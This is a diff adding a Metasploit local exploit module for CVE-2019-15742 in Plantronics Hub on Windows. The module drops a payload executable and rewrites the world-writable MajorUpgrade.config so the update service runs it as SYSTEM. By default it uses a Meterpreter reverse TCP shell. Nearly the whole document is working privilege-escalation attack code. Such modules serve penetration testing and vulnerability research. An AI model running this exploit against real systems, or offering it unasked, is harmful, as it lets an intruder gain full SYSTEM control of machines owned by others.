@@ -1,0 +1,113 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Exploit::EXE
+  include Post::File
+  include Post::Windows::Priv
+  include Post::Windows::Services
+  include Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Plantronics Hub SpokesUpdateService Privilege Escalation',
+      'Description'    => %q{
+        The Plantronics Hub client application for Windows makes use of an
+        automatic update service `SpokesUpdateService.exe` which automatically
+        executes a file specified in the `MajorUpgrade.config` configuration
+        file as SYSTEM. The configuration file is writable by all users by default.
+
+        This module has been tested successfully on Plantronics Hub version 3.13.2
+        on Windows 7 SP1 (x64).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+      [
+        'Markus Krell', # Discovery and PoC
+        'bcoles'        # Metasploit
+      ],
+      'References'     =>
+        [
+          ['CVE', '2019-15742'],
+          ['EDB', '47845'],
+          ['URL', 'https://support.polycom.com/content/dam/polycom-support/global/documentation/plantronics-hub-local-privilege-escalation-vulnerability.pdf']
+        ],
+      'Platform'       => ['win'],
+      'SessionTypes'   => ['meterpreter'],
+      'Targets'        => [['Automatic', {}]],
+      'DisclosureDate' => '2019-08-30',
+      'DefaultOptions' =>
+        {
+          'PAYLOAD' => 'windows/meterpreter/reverse_tcp'
+        },
+      'Notes'          =>
+        {
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability'   => [ CRASH_SAFE ]
+        },
+      'DefaultTarget'  => 0))
+    register_advanced_options [
+      OptString.new('WritableDir', [false, 'A directory where we can write files (%TEMP% by default)', nil]),
+    ]
+  end
+
+  def base_dir
+    datastore['WritableDir'].blank? ? session.sys.config.getenv('TEMP') : datastore['WritableDir'].to_s
+  end
+
+  def service_exists?(service)
+    srv_info = service_info(service)
+
+    if srv_info.nil?
+      vprint_warning 'Unable to enumerate Windows services'
+      return false
+    end
+
+    if srv_info && srv_info[:display].empty?
+      return false
+    end
+
+    true
+  end
+
+  def check
+    service = 'PlantronicsUpdateService'
+
+    unless service_exists? service
+      return CheckCode::Safe("Service '#{service}' does not exist")
+    end
+
+    path = "#{session.sys.config.getenv('PROGRAMDATA')}\\Plantronics\\Spokes3G"
+
+    unless exists? path
+      return CheckCode::Safe("Directory '#{path}' does not exist")
+    end
+
+    CheckCode::Detected
+  end
+
+  def exploit
+    unless check == CheckCode::Detected
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    if is_system?
+      fail_with Failure::BadConfig, 'Session already has SYSTEM privileges'
+    end
+
+    payload_path = "#{base_dir}\\#{Rex::Text.rand_text_alphanumeric(8..10)}.exe"
+    payload_exe = generate_payload_exe
+    vprint_status "Writing payload to #{payload_path} ..."
+    write_file payload_path, payload_exe
+    register_file_for_cleanup payload_path
+
+    config_path = "#{session.sys.config.getenv('PROGRAMDATA')}\\Plantronics\\Spokes3G\\MajorUpgrade.config"
+    vprint_status "Writing configuration file to #{config_path} ..."
+    write_file config_path, "#{session.sys.config.getenv('USERNAME')}|advertise|#{payload_path}"
+    register_file_for_cleanup config_path
+  end
+end
